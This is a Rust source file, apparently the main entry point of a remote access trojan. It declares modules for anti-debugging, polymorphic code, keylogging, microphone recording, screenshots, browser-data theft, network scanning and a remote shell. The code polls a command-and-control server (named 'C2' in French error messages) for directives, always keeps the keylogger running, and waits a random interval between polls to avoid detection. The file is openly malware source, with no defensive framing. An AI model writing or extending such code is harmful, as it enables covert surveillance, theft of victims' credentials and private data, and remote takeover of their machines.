mod anti_debug;
mod browser_info;
mod connexion;
mod input;
mod kill_switch;
mod logs;
mod mic_rec;
mod network_scanner;
mod poly;
mod screenshot;
mod shell;

use rand::Rng;
use std::collections::HashSet;
use tokio::task::JoinHandle;

#[tokio::main]
async fn main() {
    poly::init_polymorph_functions();
    
    if let Some(cmd_map) = poly::get_command_map() {
        let mapping = connexion::CommandMapping {
            keylogger: cmd_map.get("keylogger").unwrap().clone(),
            screenshot: cmd_map.get("screenshot").unwrap().clone(),
            logs: cmd_map.get("logs").unwrap().clone(),
            shell: cmd_map.get("shell").unwrap().clone(),
            network_scan: cmd_map.get("network_scan").unwrap().clone(),
            browser_info: cmd_map.get("browser_info").unwrap().clone(),
            mic_rec: cmd_map.get("mic_rec").unwrap().clone(),
        };
        
        if let Err(e) = connexion::send_mapping(&mapping).await {
            eprintln!("Erreur envoi mapping: {}", e);
        }
    }

    if kill_switch::check_ks().await {
        eprintln!("Arrêt du programme : kill switch activé");
        return;
    }

    let num_to_command = [
        ("1", "keylogger"),
        ("2", "screenshot"),
        ("3", "logs"),
        ("4", "network_scan"),
        ("5", "browser_info"),
        ("6", "mic_rec"),
    ];
    let mut stopped: HashSet<String> = HashSet::new();
    let mut already_executed: HashSet<String> = HashSet::new();
    let always_run = ["keylogger"];

    loop {
        match connexion::get_directives().await {
            Ok(commands) => {
                println!("Commands received: {:?}", commands);
                let mut handles: Vec<JoinHandle<()>> = Vec::new();
                for command in commands {
                    // Gestion du stop
                    if let Some(num) = command.strip_prefix("stop ") {
                        if let Some((_, cmd_name)) = num_to_command.iter().find(|(n, _)| *n == num) {
                            println!("Arrêt demandé pour {}", cmd_name);
                            stopped.insert(cmd_name.to_string());
                            already_executed.remove(&cmd_name.to_string());
                        } else {
                            println!("Numéro de fonctionnalité inconnu pour stop: {}", num);
                        }
                        continue;
                    }
                    if stopped.contains(&command) {
                        println!("Commande stoppée ignorée: {}", command);
                        continue;
                    }
                    // Exécuter toujours les commandes de always_run
                    if !always_run.contains(&command.as_str()) && already_executed.contains(&command) {
                        continue;
                    }
                    if !always_run.contains(&command.as_str()) {
                        already_executed.insert(command.clone());
                    }
                    let cmd = command.clone();
                    let handle = tokio::spawn(async move {
                        poly::execute_poly_command(&cmd).await;
                    });
                    handles.push(handle);
                }
                for handle in handles {
                    tokio::spawn(handle).await.ok();
                }
            }
            Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
        }
        let delay = rand::rng().random_range(5..15);
        tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
    }
}